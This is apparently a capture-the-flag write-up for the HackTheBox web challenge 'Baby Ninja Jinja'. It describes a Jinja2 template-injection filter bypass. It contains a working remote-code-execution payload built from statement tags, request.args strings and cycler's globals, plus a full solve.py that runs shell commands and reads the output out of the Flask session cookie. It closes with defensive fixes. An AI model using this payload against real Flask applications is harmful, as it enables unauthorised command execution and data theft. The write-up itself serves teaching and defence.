---
title: "Baby Ninja Jinja"
date: 2027-12-08 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, jinja2, flask, filter-bypass, session-cookie]
description: "A Medium web challenge where the SSTI filter lives in the database layer: every value read back from SQLite has `{{` stripped and quotes/angle-brackets HTML-escaped before it is spliced into a Jinja2 template source. The filter is defeated with `{% %}` statement tags, string literals smuggled through `request.args`, and a blind exfiltration channel built out of Flask's signed-but-unencrypted session cookie — no SECRET_KEY required."
---

## Overview

**Baby Ninja Jinja** is a Medium-difficulty [Web](https://www.hackthebox.com/) challenge built on a small Python 2 / Flask app. A `name` parameter is stored in SQLite, read back, and string-spliced into the *source* of a Jinja2 template that is then handed to `render_template_string` — a textbook [server-side template injection](https://cwe.mitre.org/data/definitions/1336.html). The catch is that the sanitizer runs in the database layer and strips exactly the syntax you'd normally reach for. The solve routes around it with statement tags, request-parameter string smuggling, and Flask's own session cookie as a blind output channel.

## The technique

A `/debug` route dumps the full application source, which makes the bug precise:

```python
def get_db():
    db = sqlite3.connect('/tmp/ninjas.db')
    db.text_factory = (lambda s: s.replace('{{', '').
        replace("'", '&#x27;').
        replace('"', '&quot;').
        replace('<', '&lt;').
        replace('>', '&gt;')
    )
    return db

# ... in the request handler ...
query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)   # name = request.args['name']
report = render_template_string(
    acc_tmpl.replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name'])
)
```

The `name` value is inserted, immediately re-read (SQLite's `text_factory` runs on *every* value handed back to Python, stripping the literal substring `{{` and HTML-escaping quotes and angle brackets), and then spliced via plain string `.replace()` into a Jinja2 template *source string* before rendering. User input becoming template source is the whole vulnerability; stripping `{{` is a denylist on the wrong syntax.

Three observations turn that into remote code execution with a readable output channel:

1. **`{% %}` survives the filter.** Jinja2 has two brace families: output expressions `{{ ... }}` and statement tags `{% ... %}`. Only the literal `{{` is removed, so every statement tag (`{% if %}`, `{% for %}`, `{% set %}`) still executes — they just produce no output on their own.
2. **String literals come from `request.args`.** Because quotes are HTML-escaped, no `'os'` / `"id"` literal can survive. Flask injects the `request` object into every template's globals, so any string is pulled from a query parameter instead — `request.args.cmd` needs no quoting in the payload itself.
3. **`cycler` reaches `os`.** Jinja2 injects the `cycler` global (used inside `{% for %}` to alternate CSS classes). Its `__init__.__globals__` is the `jinja2.utils` module namespace, which imports `os`: `cycler.__init__.__globals__.os.popen(request.args.cmd).read()` — [OS command execution](https://cwe.mitre.org/data/definitions/78.html) with no subclass-walking and no `{{ }}`.

With no usable output expression, the result is exfiltrated as a side effect: `session.update({request.args.c: <expr>})`. Flask's session cookie (via `itsdangerous`) is **signed but not encrypted**, so the response's `Set-Cookie` value decodes to plain JSON with zero knowledge of `SECRET_KEY` — the key is only needed to *forge* a new cookie, never to *read* an existing one.

## Solution

The entire chain is a single GET request with three query parameters — no quotes, no angle brackets, no `{{` anywhere:

```
GET /?name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read()}) %}{% endif %}&c=out&cmd=cat /app/flag_<random>
```

`session.update(...)` returns `None` (falsy), so the `{% if %}` body never runs — but the side effect fires during expression evaluation regardless. The command output lands in the `out` key of the session, which Flask signs into `Set-Cookie` for us to decode.

The working `solve.py`:

```python
#!/usr/bin/env python3
import sys, base64, zlib, json, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "1337"
BASE = f"http://{TARGET}:{PORT}/"

PAYLOAD = (
    "{% if session.update({request.args.c: "
    "cycler.__init__.__globals__.os.popen(request.args.cmd).read()}) %}"
    "{% endif %}"
)

def b64pad(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def decode_flask_session(cookie_val):
    compressed = cookie_val.startswith(".")          # itsdangerous compression flag
    body = cookie_val[1:] if compressed else cookie_val
    payload_b64 = body.split(".")[0]                  # payload . timestamp . signature
    raw = zlib.decompress(b64pad(payload_b64)) if compressed else b64pad(payload_b64)
    return json.loads(raw)

def run(cmd):
    r = requests.get(BASE, params={"name": PAYLOAD, "c": "out", "cmd": cmd}, timeout=15)
    session_val = None
    for part in r.headers.get("Set-Cookie", "").split(","):
        part = part.strip()
        if part.startswith("session="):
            session_val = part.split("session=", 1)[1].split(";", 1)[0]
            break
    data = decode_flask_session(session_val)
    out = data.get("out", "")
    if isinstance(out, dict) and " b" in out:         # Python2 TaggedJSONSerializer bytes tag
        out = base64.b64decode(out[" b"]).decode(errors="replace")
    return out

if __name__ == "__main__":
    flag_path = run("find / -iname 'flag*' -not -path '/sys/*' 2>/dev/null").strip().splitlines()[0]
    print("[+]", run(f"cat {flag_path}").strip())
```

The flag file has a randomized name (`find` locates `/app/flag_<random>`), so the script discovers the path before reading it. Running it prints the live `HTB{...}` flag.

## Why it worked

The developer clearly knew SSTI was the risk — that is exactly why `{{` is stripped — but the fix is a substring/character denylist applied to the wrong layer. Denylisting `{{` and quotes leaves `{% %}` statement tags, the `request` global, and framework-injected objects like `cycler` fully reachable, and any of those is enough for code execution. The signed-not-encrypted session cookie then hands back an output channel for free, so even a "blind" sink (output discarded unless `session['leader']` is set) leaks everything.

## Fix / defense

- Never build template *source* from user input. Pass user data as a render *variable* (`render_template('page.html', name=user_name)`), where autoescaping applies to the *value*, not the template structure.
- Character/substring denylists (`{{`, quotes, `<`/`>`) are not a template-injection fix — `{% %}`, filters, and external context objects route around them.
- If templating truly must run on semi-trusted input, use `jinja2.sandbox.SandboxedEnvironment`, and treat it as defense-in-depth rather than a substitute for not rendering attacker strings as source.
- Encrypt session state (or keep it server-side) so mutating the session cannot be used as a covert side channel — signing alone protects integrity, not confidentiality.
